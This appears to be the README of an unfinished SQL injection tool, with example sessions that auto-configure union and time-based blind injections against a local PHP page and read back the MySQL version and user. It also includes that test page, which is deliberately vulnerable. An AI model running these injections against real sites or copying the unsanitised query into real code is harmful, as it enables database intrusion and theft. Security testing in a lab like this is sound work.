This is a work in progress.

Features
========

* automatic blind / union sql injection configuration 
* use cache to reduce traffic and allow offline replays
* CLI with some SQL-like commands

TODO 
====

* robust blind injections calibration
* refactorize SQL generation 

Example usage
=============

Typical union injection
-----------------------


    $ python proto2.py
    WARNING - No proxy
    > set url_format http://localhost/www.tmp/sql.php?i=%s
    localhost> configure
    INFO - Sucessfully configured
    INFO - Config union_injection_format = '0 UNION (%s) #'
    INFO - Config column_index = 0
    INFO - Config columns = 19
    localhost> help
    ...

Blind SQL injections
--------------------

    $ python proto2.py --url http://127.0.0.1/www.tmp/sql.php?i=%s --no-proxy --proxy "" --mode blind
    WARNING - No proxy
    127.0.0.1> configure
    INFO - Launching autoconfiguration
    WARNING - Disabling cache and setting random urls
    WARNING - No proxy
    INFO - Checking injections
    INFO - Injection found
    INFO - Mean: 0.006, dev: 0.050
    INFO - Calibrating
    INFO - Fine tuning
    INFO - High: 1.000
    INFO - Optimizing timing
    INFO - Sucessfully configured
    INFO - Config blind_injection_format = '1 AND (%s)'
    INFO - Config blind_sleep_format = '%s AND SLEEP(%.2f)'
    INFO - Config blind_time_sleep = 0.005859375
    INFO - Config blind_time_low = 0.0055620670318603516
    INFO - Config blind_time_high = 0.060056871838039823
    INFO - Config blind_time_confidence = 0.050000000000000003
    127.0.0.1> probe
    INFO - MySQL Version: ['5.0.67-1-log']
    INFO - MySQL user: ['test@localhost']

Misc
----

sql.php 

    <?
    if ($_SERVER['REMOTE_ADDR']!="127.0.0.1") die("");
    if ($_GET['rand']) echo rand();
    mysql_connect("localhost", "test");
    $i = $_GET['i'];
    if ((int)$i<100) {
	    //$query = "select * from information_schema.columns limit $i,1";
	    $query = "select * from information_schema.columns where  ordinal_position = $i";
	    file_put_contents("/tmp/queries", "$query\n", FILE_APPEND);
	    #echo "<pre>$query</pre>";
	    $result = mysql_query($query) or die("error");
	    echo "<h1>Results:</h1>";
	    while($row = mysql_fetch_array($result)){
		    echo "<p>$row[0]:$row[1]</p>";
	    }
    }
    ?>
